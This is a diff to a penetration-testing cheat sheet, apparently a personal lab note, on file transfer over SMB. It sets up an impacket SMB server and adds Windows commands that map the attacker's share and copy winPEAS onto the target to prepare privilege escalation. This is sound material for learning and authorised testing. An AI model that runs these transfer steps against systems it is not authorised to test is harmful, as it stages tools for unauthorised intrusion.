@@ -3,11 +3,20 @@
 ```bash
 impacket-smbserver share . -smb2support -username user -password pass
 ```
-
 ## Access authenticated SMB share from Windows
 ```cmd
 net use \\10.10.14.5\share /user:user pass
 ```
+
+## Map SMB Server to Z: and create C:\working directory with scripts
+```cmd
+mkdir C:\working
+cd C:\working
+net use Z: \\IP\share /user:user pass
+copy Z:\uploads\winPEASx64.exe .
+```
+Run [[Windows Privilege Escalation#winPEAS Run and Copy to Z downloads winpeas]] next.
+
 
 ## Download file (PowerShell Start-BitsTransfer)
 ```PowerShell
